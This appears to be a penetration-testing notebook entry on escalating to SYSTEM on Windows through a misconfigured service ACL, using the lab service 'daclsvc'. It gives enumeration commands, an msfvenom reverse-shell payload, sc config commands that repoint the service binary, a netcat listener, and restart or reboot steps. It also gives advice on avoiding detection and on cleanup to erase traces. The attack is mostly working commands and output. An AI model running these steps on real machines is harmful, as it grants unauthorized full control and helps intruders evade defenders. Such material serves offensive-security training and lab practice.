# Living off the Land

## 01 - Enumerate

Poorly configurations of some services that allows users to alter or overwrite the executable binary path that leads to full privileges. We use the the Windows builtin command line tool `sc.exe` that is called **SCM (Service Control Manager)** to manage the services.

### 1.1 - Command Prompt

First we enumerate to discover the `LocalSystem`.

```

We find the service name called `daclsvc` let's query it to see what privileges it has. We'll be running with a command `sc.exe` which is called SCM (Service Control Management) that it comes builtin in the Windows operating system. This is the following syntax we're gonna use to enumerate:

```
C:\> sc qc <servicesvc>
```

Once executed we can see the **`BINARY_PATH_NAME`** with the service executable, and **`SERVICE_START_NAME`** runs as **`LocalSystem`** with **`SYSTEM`**.

```
C:\> sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

To verify even further we have two other methods to enumerate it in order to confirm that we can elevate it to higher level of privileges. Run `icacls.exe` to view the **ACL (Access Control Lists)**.

> [!NOTE]
> The `BUILTIN\Users:(I)(RX)` meant that it is configured into that can read and executable to users so in other words we can use the `sc.exe` command to start, stop and configure binary of the service. What you should look out for is `BUILTIN\Users:(I)(F)` that has granted the users full access so we can modify in that specific path or `BUILTIN\Users:(I)(RX)` should be enough so we can change the binary path to execute our malware.


```
C:\> icacls "C:\Program Files\DACL Service\daclservice.exe"
C:\Program Files\DACL Service\daclservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                              BUILTIN\Administrators:(I)(F)
                                              BUILTIN\Users:(I)(RX)
                                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Using `accesschk.exe` sysinternals tool. This is following syntax when executing the sysinternal binary:

```
C:\> accesschk.exe /accepteula -uwcqv <username> <servicesvc>
```

When using a user account with least privileges let's say for example `user` that has a permission to modify the service configuration **`SERVICE_CHANGE_CONFIG`**. That indicates to all the last three methods we've tested that we can elevate it with **`SYSTEM`** privileges. This is just for you to understand how you can tell to exploit the misconfigured Windows services.

```
C:\> accesschk.exe /accepteula -uwcqv %username% daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

One last thing is that you don't need to use `accesschk.exe` because cybersecurity firms has now made it possible to detect the legitimate sysinternals suite toolkit that was made by microsoft. The developer had to include the `/accepteula` flag that will pop an event viewer alert ID but it's not always the case if the administrators are using it. This is why I've showed you a few ways to enumerate to break down step by step to further confirm that it is indeed exploitable. Use the other two previous methods other than the `accesschk.exe`.

### 1.2 - PowerShell

First we enumerate to discover the `LocalSystem`.

```
PS C:\> Get-WmiObject -ClassName Win32_Service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

PS C:\> Get-CimInstance -ClassName Win32_Service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

This is the following syntax we're gonna use to enumerate:

```
PS C:\> Get-Service <servicesvc> | Format-List
```

```
PS C:\> Get-Service daclsvc | Format-List
Get-Service daclsvc | Format-List


Name                : daclsvc
DisplayName         : DACL Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32OwnProcess
```

To verify even further we have one method to enumerate it in order to confirm that we can elevate it to higher level of privileges.

```
PS C:\> get-acl "C:\Program Files\DACL Service\daclservice.exe" | format-list


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\DACL Service\daclservice.exe
Owner  : BUILTIN\Administrators

Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  :

         x1200a9;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)
```

Notice on the powershell cmdlet gave us with this particular line `BUILTIN\Users Allow ReadAndExecute, Synchronize` the word **"Allow"** and **"ReadAndExecute"** indicates that the users can configure it path of the service in anyway they want. We can display more information to combine `Get-ACL` with `ConvertFrom-SddlString`

```
PS C:\> $acl = get-acl -path "C:\Program Files\DACL Service\daclservice.exe"
PS C:\> convertfrom-sddlstring -sddl $acl.sddl | foreach-object {$_.DiscretionaryAcl}
NT AUTHORITY\SYSTEM: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, FullControl, FullControl, FullControl, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Users: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES: AccessAllowed Inherited (GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Synchronize, Traverse)
```

We can shorten it into this.

```
PS C:\> get-acl "C:\Program Files\DACL Service\daclservice.exe" | format-list AccessToString
```

Looks like powershell has a better way to give more information of what we can do with it.

## 02 - Exploit

From the enumeration phase we know this is a manual service start mode. So we have to enable it manually to receive a reverse shell connection since we have permission to do so. This is what the syntax looks like to modify the configuration to our reverse shell.

```
C:\> sc config <servicesvc> binpath="\"<drive_letter:>\path\to\payload.exe"
```

Generate a stageless reverse shell via `msfvenom` tool and then use any of the **file transfer techniques** then let's copy our reverse shell in the `C:\Temp` folder. Why stageless? The reason is if we use staged payloads it will stop the payload right away before it finishes which is why stageless payloads is a suitable job for this vector attack.

```
$ msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=53 -f exe-service -o payload.exe
```

In command prompt

```
C:\> copy payload.exe c:\temp\

C:\> sc config daclsvc binpath="\"c:\temp\payload.exe\""
```

In powershell

```
PS C:\> copy-item shell.exe -destination c:\temp\

PS C:\> Set-Service -Name daclsvc -DisplayName "DACL Service"
```

And start the reverse shell handler with netcat

```
$ sudo nc -lnvp 53
```

Before we execute the payload we must do a check if the service is automatic or manual. To do this in command prompt:

```
C:\> wmic service where "name='daclsvc'" get startmode
StartMode
Manual
```

In powershell:

```
PS C:\> Get-WmiObject -ClassName win32_service -Filter "Name='daclsvc'" | Select-Object StartMode

PS C:\> Get-CimInstance -ClassName win32_service -Filter "Name='daclsvc'" | Select-Object StartMode

StartMode
---------
Manual
```

### 2.1 - Restart the service automatically

Realistically not all services are set to manual. If you discovered an error output like this:

```
C:\> sc stop vulnerablesvc
System error 5 has occured.

Access is denied
```

When escalating to **SYSTEM** privileges you may not have the privileges to `start` or `stop` the service via `sc.exe` or `net.exe`. And you should have the privilege to shutdown/reboot the Windows system. To confirm this execute following command:

```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Another way to confirm that if the current user's access tokens have `SeShutdownPrivilege` is by running it via PowerShell cmdlet.

![[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Windows/Host/0xA - Users/Manual/Living off the Land#^a5f1fa]]

After you have configured the the `binpath` for your reverse shell connection. Execute the command to reboot the system. In command prompt:

```
C:\> shutdown /r /t 0
```

In powershell:

```
PS C:\> Restart-Computer
```

### 2.2 - Restart the service manually

In command prompt:

```
C:\> net start daclsvc

C:\> sc start daclsvc
```

In powershell:

```
PS C:\> Start-Service daclsvc
```

Enumerate the current user that shows we are elevated.

```
$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.145.32.
Ncat: Connection from 10.10.145.32:49859.
Microsoft Windows [Version 10.0.17763.737]

C:\Windows\System32> whoami
nt authority\system
```

## 03 - Cleanup

Now let's revert back the original configuration to clear our trace ahead of time.

```
C:\Windows\System32> sc config daclsvc binpath="\"C:\Program Files\DACL Service\daclservice.exe"
```
